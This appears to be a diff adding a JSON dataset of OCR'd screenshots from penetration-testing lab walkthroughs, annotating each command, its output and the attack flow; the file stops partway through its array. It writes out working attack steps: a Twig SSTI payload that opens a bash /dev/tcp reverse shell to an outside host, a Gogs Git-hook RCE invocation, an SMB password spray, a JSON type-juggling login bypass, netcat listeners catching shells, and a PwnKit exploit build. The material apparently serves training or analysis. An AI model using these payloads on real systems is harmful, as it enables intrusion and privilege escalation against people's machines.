@@ -1,0 +1,2177 @@
+[
+  {
+    "source": {
+      "url": "assets/assignment/capture-003-a6b6b9c9dc.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "a6b6b9c9dc974f0ee50b9c1bd5ec9f60a9f4ceec0f509a40d8766edb9484eb2b",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "python gogs.py -s 192.168.236.224:8000 -u jane -p '<redacted>' -t false -r 192.168.45.164:80",
+        "tool": "python",
+        "raw_output": "[+] Login successful as jane.\n[+] Repository TestRepoTW8FVU created.\n[+] User can create Git hooks.\n[+] Reverse shell commands pasted in post-receive Git hook.\n[+] Waiting for connections on :::80: Got connection from ::ffff:192.168.236.224 on port 44552\n[*] Switching to interactive mode\nbash: cannot set terminal process group (849): Inappropriate ioctl for device\nbash: no job control in this shell\njane@assignment:~/gogs-repositories/jane/testrepotw8fvu.git$ $ whoami\njane\njane@assignment:~/gogs-repositories/jane/testrepotw8fvu.git$ $ id\nuid=1000(jane) gid=1000(jane) groups=1000(jane)",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.validated"
+      },
+      {
+        "kind": "web.rce"
+      },
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "access.shell"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "IDOR note credential recovery",
+      "Gogs authenticated post-receive Git hook RCE on port 8000",
+      "uid=1000(jane) shell"
+    ],
+    "notes": "Terminal screenshot showing exact Gogs-RCE python invocation with username jane (omitted from Markdown code blocks) and resulting interactive shell as uid=1000(jane)."
+  },
+  {
+    "source": {
+      "url": "assets/assignment/capture-005-db15700d2f.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "db15700d2f79d2a631fcb8568cfe7035123ae2ab3578a05ef364fd093a918e67",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "nc -lvnp 4444",
+        "tool": "nc",
+        "raw_output": "listening on [any] 4444 ...\nconnect to [192.168.45.164] from (UNKNOWN) [192.168.236.224] 58284\nls\nclean-tmp.sh\nproof.txt\nsnap\ncat proof.txt\n<redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "access.root"
+      },
+      {
+        "kind": "loot.files"
+      },
+      {
+        "kind": "objective.flag_located_root"
+      },
+      {
+        "kind": "proof.captured"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "clean-tmp.sh cron filename command-substitution trigger",
+      "netcat listener callback on port 4444",
+      "proof.txt capture"
+    ],
+    "notes": "Netcat listener screenshot catching the root cron callback and listing /root (clean-tmp.sh, proof.txt, snap) followed by cat proof.txt without running id or whoami."
+  },
+  {
+    "source": {
+      "url": "assets/hepet/capture-002-44c8f705b3.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "44c8f705b3bd277958584cdab491724aeadcebd376b61f391cec05ea5476bb63",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "nc 192.168.187.140 143",
+        "tool": "nc",
+        "raw_output": "* OK localhost IMAP4rev1 Mercury/32 v4.62 server ready.\nA1 LOGIN jonas <redacted>\nA1 OK LOGIN completed.\nA1 LIST \"\" *\n* LIST (\\NoInferiors) \"/\" INBOX",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "service.imap.banner"
+      },
+      {
+        "kind": "credential.validated"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "HTTP 8000 password reuse on IMAP 143",
+      "raw IMAP A1 LOGIN jonas validation",
+      "INBOX mailbox listing"
+    ],
+    "notes": "Terminal screenshot showing raw IMAP authentication over netcat against Mercury/32 v4.62 (`A1 OK LOGIN completed.`) and INBOX listing; no IMAP commands appear in Markdown code blocks."
+  },
+  {
+    "source": {
+      "url": "assets/hokkaido/capture-004-cdbb85a96f.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "cdbb85a96faa5618a8be3af2c0b528892b0b9f0cf418c970effa5b50dbb9654c",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "smbclient //192.168.242.40/NETLOGON -U 'hokkaido-aerospace.com\\info' --password='<redacted>'",
+        "tool": "smbclient",
+        "raw_output": "Try \"help\" to get a list of possible commands.\nsmb: \\> dir\n  temp                                D        0  Wed Dec  6 10:44:26 2023\nsmb: \\> cd temp\nsmb: \\temp\\> dir\n  password_reset.txt                  A       27  Sat Nov 25 08:40:29 2023\nsmb: \\temp\\> type password_reset.txt\ntype: command not found\nsmb: \\temp\\> mget *\nGet file password_reset.txt? y\ngetting file \\temp\\password_reset.txt of size 27 as password_reset.txt (0.2 KiloBytes/sec)",
+        "truncated": false,
+        "fidelity": "ocr"
+      },
+      {
+        "command_shown": "cat password_reset.txt",
+        "tool": "cat",
+        "raw_output": "Initial Password: <redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "smb.authenticated"
+      },
+      {
+        "kind": "smb.readable_share"
+      },
+      {
+        "kind": "loot.files"
+      },
+      {
+        "kind": "credential.plaintext"
+      },
+      {
+        "kind": "credential.candidate"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "smbclient_invalid_subcommand",
+        "error": "type: command not found"
+      },
+      {
+        "blocker": "file_not_found",
+        "error": "cat: password: No such file or directory"
+      }
+    ],
+    "flow": [
+      "SMB NETLOGON\\temp enumeration",
+      "mget password_reset.txt",
+      "Initial Password disclosure"
+    ],
+    "notes": "Terminal screenshot showing smbclient access to NETLOGON\\temp\\password_reset.txt, two minor operator command errors (`type` inside smbclient and `cat password`), and disclosure of `Initial Password: <redacted>`."
+  },
+  {
+    "source": {
+      "url": "assets/hokkaido/capture-005-254f421211.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "254f421211feea6538012a65d50f04245d22d17d21504be87524fef6ac918c7a",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "netexec smb 192.168.242.40 -u users.txt -p passwords.txt",
+        "tool": "netexec",
+        "raw_output": "[+] hokkaido-aerospace.com\\discovery:<redacted>\n[-] hokkaido-aerospace.com\\maintenance:<redacted> STATUS\n[-] hokkaido-aerospace.com\\hrapp-service:<redacted> STAT",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "smb.authenticated"
+      },
+      {
+        "kind": "credential.validated"
+      },
+      {
+        "kind": "blocker.logon_failure"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "blocker.logon_failure",
+        "error": "[-] hokkaido-aerospace.com\\maintenance:<redacted> STATUS"
+      }
+    ],
+    "flow": [
+      "NETLOGON password spray across enumerated domain users",
+      "discovery account authentication hit"
+    ],
+    "notes": "Horizontally cropped netexec/crackmapexec output showing `[+] hokkaido-aerospace.com\\discovery:<redacted>` (correcting the walkthrough prose typo `discover`)."
+  },
+  {
+    "source": {
+      "url": "assets/hokkaido/capture-009-536ea90f9f.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "536ea90f9f8d11b26562c3cf6b75ce8a7a17de325cb609dba8fbc31ccb270ed2",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "rpcclient -U 'hokkaido-aerospace.com\\Hazel.Green' --password='<redacted>' 192.168.242.40 -c 'enumdomgroups; querygroup 0x474; querygroupmem 0x474; queryuser 0x452'",
+        "tool": "rpcclient",
+        "raw_output": "group:[Tier2-Admins] rid:[0x474]\ngroup:[Tier1-Admins] rid:[0x475]\ngroup:[Tier0-Admins] rid:[0x476]\nrpcclient $> querygroup 0x474\n        Group Name:     Tier2-Admins\n        Description:\n        Group Attribute:7\n        Num Members:1\nrpcclient $> querygroupmem 0x474\n        rid:[0x452] attr:[0x7]\nrpcclient $> queryuser 0x452\n        User Name   :   Hazel.Green\n        Full Name   :   Hazel Green",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ad.group_list"
+      },
+      {
+        "kind": "ad.user_list"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "rpcclient enumdomgroups",
+      "querygroup / querygroupmem RID 0x474 (Tier2-Admins)",
+      "queryuser RID 0x452 -> Hazel.Green"
+    ],
+    "notes": "Interactive rpcclient capture enumerating Tier2-Admins (0x474), Tier1-Admins (0x475), and Tier0-Admins (0x476) and resolving Tier2-Admins membership RID 0x452 to Hazel.Green."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-001-ccaa643b4f.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "ccaa643b4f6c84754c93222133c40800da773da0696112b19564075d3099591c",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -i http://192.168.151.203/Home.html",
+        "tool": "curl",
+        "raw_output": "<title>ILLUSION DESIGN STUDIO</title>\n<nav>Home | Login | Dashboard</nav>\n<h1>SUPREME - ILLUSION DESIGN STUDIO</h1>\n<p>New Applications currently closed. contact us</p>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "http.reachable"
+      },
+      {
+        "kind": "web.title"
+      },
+      {
+        "kind": "web.paths"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Browse landing page /Home.html",
+      "Identify Login and Dashboard navigation endpoints"
+    ],
+    "notes": "Browser screenshot of http://192.168.151.203/Home.html showing ILLUSION DESIGN STUDIO landing page and Home, Login, Dashboard navigation links."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-002-dd4150b1f6.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "dd4150b1f6d7ee123bb937b850ef2cb89236c052943d197b32d5e9ea0dfe07ef",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -i -X POST http://192.168.151.203/login.php -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=<redacted>' -d '{\"user\":\"admin\",\"password\":\"<redacted>\"}'",
+        "tool": "burp",
+        "raw_output": "POST /login.php HTTP/1.1\r\nHost: 192.168.151.203\r\nContent-Length: 35\r\nContent-Type: application/json\r\nOrigin: http://192.168.151.203\r\nReferer: http://192.168.151.203/login.php\r\nCookie: PHPSESSID=<redacted>\r\nConnection: close\r\n\r\n{\r\n  \"user\":\"admin\",\r\n  \"password\":\"<redacted>\"\r\n}",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "http.reachable"
+      },
+      {
+        "kind": "web.login_form"
+      },
+      {
+        "kind": "web.parameterized"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Intercept POST /login.php JSON login payload in Burp",
+      "Mutate JSON password string to boolean true for PHP loose comparison bypass"
+    ],
+    "notes": "Burp Suite request capture showing POST /login.php accepting application/json user and password fields prior to boolean password=true authentication bypass."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-003-d63d9ea759.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "d63d9ea75907b55c6dbab6927ff93a051941595db73f31d57dfb7e8886d747d0",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -i -b 'PHPSESSID=<redacted>' http://192.168.151.203/dashboard.php",
+        "tool": "curl",
+        "raw_output": "<h1>Request your Order</h1>\n<form action=\"dashboard.php\" method=\"GET\">\n  <input name=\"name\" placeholder=\"Name\">\n  <textarea name=\"description\" placeholder=\"Description\"></textarea>\n  <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.authz_bypass"
+      },
+      {
+        "kind": "web.paths"
+      },
+      {
+        "kind": "web.param_candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "JSON boolean type-juggling authentication bypass",
+      "Authenticated /dashboard.php Request your Order form discovery"
+    ],
+    "notes": "Browser capture of authenticated /dashboard.php reached after JSON password=true bypass, exposing the Request your Order form with Name and Description fields."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-004-baa340175a.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "baa340175a17b2a31e1c774e4671d65703a16bf1661af20fb48837de156b12fc",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "dirsearch -u \"http://192.168.151.203\"",
+        "tool": "dirsearch",
+        "raw_output": "Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927\nTarget: http://192.168.151.203/\n[07:08:12] 302 -    0B  - /dashboard.php  ->  login.php\n[07:08:18] 200 -   15KB - /favicon.ico\n[07:08:22] 200 -    3KB - /images/\n[07:08:22] 301 -  319B  - /images  ->  http://192.168.151.203/images/\n[07:08:22] 200 -   58B  - /index.html\n[07:08:27] 200 -    9KB - /login.php\n[07:08:56] 200 -    0B  - /vendor/composer/autoload_namespaces.php\n[07:08:56] 200 -    0B  - /vendor/composer/autoload_psr4.php\n[07:08:56] 200 -    1KB - /vendor/\n[07:08:56] 200 -    0B  - /vendor/autoload.php\n[07:08:56] 200 -    0B  - /vendor/composer/autoload_classmap.php\n[07:08:56] 200 -    0B  - /vendor/composer/autoload_real.php\n[07:08:56] 200 -    0B  - /vendor/composer/ClassLoader.php",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.paths"
+      },
+      {
+        "kind": "web.content_map"
+      },
+      {
+        "kind": "http.redirect"
+      },
+      {
+        "kind": "web.exposed_artifact"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "dirsearch directory enumeration",
+      "Exposed /vendor/ and /vendor/composer/ PHP dependency metadata discovery"
+    ],
+    "notes": "Terminal screenshot of dirsearch v0.4.2 discovering /dashboard.php (302 -> login.php), /login.php (200), and exposed /vendor/composer/ endpoints."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-005-433edcf380.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "433edcf380211f7bb0cd04fe6f08c807c8173e51f2ca330afcd1b1a475967b57",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -s http://192.168.151.203/vendor/composer/installed.json",
+        "tool": "curl",
+        "raw_output": "[\n  {\n    \"name\": \"twig/twig\",\n    \"version\": \"v1.19.0\",\n    \"version_normalized\": \"1.19.0.0\",\n    \"source\": {\n      \"type\": \"git\",\n      \"url\": \"https://github.com/twigphp/Twig.git\"\n    }\n  }\n]",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.exposed_artifact"
+      },
+      {
+        "kind": "web.tech"
+      },
+      {
+        "kind": "web.source"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Fetch /vendor/composer/installed.json",
+      "Fingerprint twig/twig v1.19.0 template engine"
+    ],
+    "notes": "Browser view of exposed Composer installed.json disclosing twig/twig version v1.19.0 (1.19.0.0)."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-006-2fb3b08cc8.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "2fb3b08cc8e559f5b4bdc4958247c2ec05077a298540545bc4086ed16a3056ad",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "searchsploit twig 1.19",
+        "tool": "searchsploit",
+        "raw_output": "Twig < 2.4.4 - Server Side Template Injection | exploits/php/webapps/44102.txt",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "exploit.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Version lookup for Twig 1.19.0",
+      "Identify Exploit-DB 44102 Twig < 2.4.4 SSTI"
+    ],
+    "notes": "Browser search screenshot matching twig/twig 1.19.0 against Exploit-DB 44102 (Twig < 2.4.4 Server Side Template Injection)."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-007-2caa9227da.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "2caa9227daaca92e2ca5074511d5b6a55baa816dea3f26fccc195536fa7fc906",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "searchsploit -x 44102",
+        "tool": "searchsploit",
+        "raw_output": "# Exploit Title: Twig <2.4.4 Server side template injection\n# Version: < 2.4.4\nExample: http://localhost/search?search_key={{4*4}} -> Output: 16",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "exploit.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Review Exploit-DB 44102 advisory details",
+      "Extract {{4*4}} Twig arithmetic SSTI probe"
+    ],
+    "notes": "Browser capture of Exploit-DB 44102 advisory body showing Twig {{4*4}} -> 16 SSTI verification syntax."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-008-5f08d0d656.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "5f08d0d6567e1fa2a85db9bc5b7325b1f812ac2648be92b9139e43bcb6e53263",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -i -b 'PHPSESSID=<redacted>' 'http://192.168.151.203/dashboard.php?name=test&submit=Submit'",
+        "tool": "curl",
+        "raw_output": "HTTP/1.1 200 OK\r\n\r\nYou Order 'test' has been sent",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.parameterized"
+      },
+      {
+        "kind": "web.param_candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Submit order form on /dashboard.php",
+      "Observe GET parameter name reflected in response banner"
+    ],
+    "notes": "Browser capture of /dashboard.php?name=...&submit=Submit revealing GET query parameter submission and direct reflection of the name parameter."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-009-ebe6615ffe.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "ebe6615ffeabb62e49bc82cac2269613721ed76b18bb9dbd60becf43df453ffd",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -i -G -b 'PHPSESSID=<redacted>' 'http://192.168.151.203/dashboard.php' --data-urlencode 'name={{4*4}}' --data-urlencode 'description=123' --data-urlencode 'submit=Submit'",
+        "tool": "curl",
+        "raw_output": "Request your Order\nName: {{4*4}}\nDescription: 123\nSubmit",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.param_candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Stage {{4*4}} Twig arithmetic SSTI probe in /dashboard.php Name input prior to submission"
+    ],
+    "notes": "Browser form capture entering {{4*4}} into the Name field and 123 into Description on /dashboard.php prior to clicking Submit (server evaluation to 16 appears in the subsequent capture-010 screenshot)."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-014-739baf80d3.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "739baf80d3f59e74193db5068a2dad310b0623953f3dba261f77e3e71595db83",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -i -G -b 'PHPSESSID=<redacted>' 'http://192.168.151.203/dashboard.php' --data-urlencode \"name={{_self.env.registerUndefinedFilterCallback(\\\"exec\\\")}}{{_self.env.getFilter(\\\"bash -c '/bin/sh -i >& /dev/tcp/192.168.45.187/22 0>&1'\\\")}}\" --data-urlencode 'submit=Submit'",
+        "tool": "curl",
+        "raw_output": "Name: FilterCallback(\"exec\")}}{{_self.env.getFilter(\"bash -c '/bin/sh -i >& /dev/tcp/192.168.45.187/22 0>&1'\")}}",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.param_candidate"
+      },
+      {
+        "kind": "exploit.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Wrap /dev/tcp reverse shell inside bash -c for Twig exec filter callback",
+      "Stage Twig SSTI RCE payload in /dashboard.php Name input prior to submission"
+    ],
+    "notes": "Browser form capture showing the Twig registerUndefinedFilterCallback('exec') payload wrapping bash -c reverse shell to port 22 staged in the Name input prior to submission (required because PHP exec invokes /bin/sh where >& /dev/tcp redirection fails without bash -c)."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-015-2b68833ceb.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "2b68833ceb667ac5c77644b1f9175fba76248b64c17bf41c7e79e0dba12916f5",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "nc -nlvp 22",
+        "tool": "nc",
+        "raw_output": "listening on [any] 22 ...\nconnect to [192.168.45.187] from (UNKNOWN) [192.168.151.203] 53032\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "listener.open"
+      },
+      {
+        "kind": "web.rce"
+      },
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "access.shell"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Netcat listener on TCP port 22",
+      "Receive reverse shell as www-data"
+    ],
+    "notes": "Terminal screenshot showing nc -nlvp 22 catching the Twig SSTI reverse shell and confirming execution as www-data."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-016-06957f73dc.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "06957f73dc1f34f03b6b9c73bf202fea72cea89041a16ca75e64d56b67bb1609",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "./linpeas.sh",
+        "tool": "linpeas",
+        "raw_output": "Linux version 5.4.0-110-generic (buildd@ubuntu) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 202\nDistributor ID: Ubuntu\nDescription:    Ubuntu 20.04.4 LTS\nRelease:        20.04\nCodename:       focal\nSudo version 1.8.31\nPATH: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "host.os_family"
+      },
+      {
+        "kind": "host.kernel"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Run LinPEAS System Information sweep",
+      "Identify Ubuntu 20.04.4 LTS kernel 5.4.0-110-generic and Sudo 1.8.31"
+    ],
+    "notes": "LinPEAS System Information screenshot disclosing Ubuntu 20.04.4 LTS, Linux kernel 5.4.0-110-generic, and Sudo 1.8.31."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-017-6489f7edab.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "6489f7edab51f77c45d6fdb08af79586595c62bbc5beb9ce52c4d6822cece650",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "./linpeas.sh",
+        "tool": "linpeas",
+        "raw_output": "Active Ports\ntcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "scan.local.listeners"
+      },
+      {
+        "kind": "pivot.ports"
+      },
+      {
+        "kind": "pivot.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Inspect local listening TCP sockets via LinPEAS",
+      "Identify loopback-only Redis service on 127.0.0.1:6379 for port forwarding"
+    ],
+    "notes": "LinPEAS Active Ports screenshot exposing internal loopback listener 127.0.0.1:6379 (Redis), which is absent from external Nmap scan."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-018-7dbd38ddce.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "7dbd38ddcec9d7491f383c573ce9c9f1c8163d1f770fae3d7c50d68a22007500",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "./linpeas.sh",
+        "tool": "linpeas",
+        "raw_output": "Superusers\nroot:x:0:0:root:/root:/bin/bash\nUsers with console\njames:x:1000:1000::/home/james:/bin/sh\nroot:x:0:0:root:/root:/bin/bash\nAll users & groups\nuid=0(root) gid=0(root) groups=0(root)\nuid=1000(james) gid=1000(james) groups=1000(james)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=998(lxd) gid=100(users) groups=100(users)",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.candidate"
+      },
+      {
+        "kind": "config.review"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Enumerate console-capable local accounts via LinPEAS",
+      "Discover local user james (/home/james)"
+    ],
+    "notes": "LinPEAS Users section enumerating console accounts root and james (uid=1000, /home/james) along with full uid/gid/group mappings."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-019-ed200f6327.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "ed200f6327784321c9a00f65641d8feee62eed3f719d2d33ce98701e86aed225",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "./linpeas.sh",
+        "tool": "linpeas",
+        "raw_output": "Useful software\n/usr/bin/base64\n/usr/bin/curl\n/usr/bin/g++\n/usr/bin/gcc\n/snap/bin/lxc\n/usr/bin/make\n/usr/bin/nc\n/usr/bin/ncat\n/usr/bin/netcat\n/usr/bin/perl\n/usr/bin/php\n/usr/bin/ping\n/usr/bin/python3\n/usr/bin/sudo\n/usr/bin/wget",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "host.notable_program"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "LinPEAS useful software inventory",
+      "Confirm gcc, make, curl, wget, and python3 availability on target"
+    ],
+    "notes": "LinPEAS Software Information capture listing installed compilers and transfer tools (/usr/bin/gcc, make, curl, wget, nc, python3)."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-020-ba5ef9ac85.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "ba5ef9ac8520e9968157a48e11fd27b3b3c41ade8e26399bdf612a353ce374b7",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "./linpeas.sh",
+        "tool": "linpeas",
+        "raw_output": "Searching root files in home dirs (limit 30)\n/home/\n/home/james/.bash_history\n/root/\n/var/www\nInteresting writable files owned by me or writable by everyone (not in Home) (max 500)\n/dev/mqueue\n/dev/shm\n/home/james\n/home/james/.bash_logout\n/home/james/.bashrc\n/home/james/.profile\n/home/james/local.txt\n/home/james/redis-openssl-gen-pass.txt",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "loot.files"
+      },
+      {
+        "kind": "objective.flag_located_user"
+      },
+      {
+        "kind": "config.review"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "LinPEAS writable/accessible files sweep",
+      "Locate /home/james/local.txt and /home/james/redis-openssl-gen-pass.txt"
+    ],
+    "notes": "LinPEAS interesting files capture disclosing /home/james/local.txt and /home/james/redis-openssl-gen-pass.txt (the sole place in the walkthrough where the full path to the Redis password file is shown)."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-021-1aa334ede8.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "1aa334ede8834afa8e5577803b927cff572de19d0c3d7df279eb49226f0c8a55",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "make && ./cve-2021-4034 && id",
+        "tool": "sh",
+        "raw_output": "$ make\ncc -Wall --shared -fPIC -o pwnkit.so pwnkit.c\ncc -Wall    cve-2021-4034.c   -o cve-2021-4034\necho \"module UTF-8// PWNKIT// pwnkit 1\" > gconv-modules\nmkdir -p GCONV_PATH=.\ncp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.\n$ ./cve-2021-4034\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "access.shell"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "patched_polkit",
+        "error": "./cve-2021-4034 exited without privilege escalation (uid remains 33 www-data)"
+      }
+    ],
+    "flow": [
+      "Compile CVE-2021-4034 PwnKit exploit on target",
+      "Execute ./cve-2021-4034 -> fails to escalate",
+      "Abandon kernel/polkit path in favor of Redis password file"
+    ],
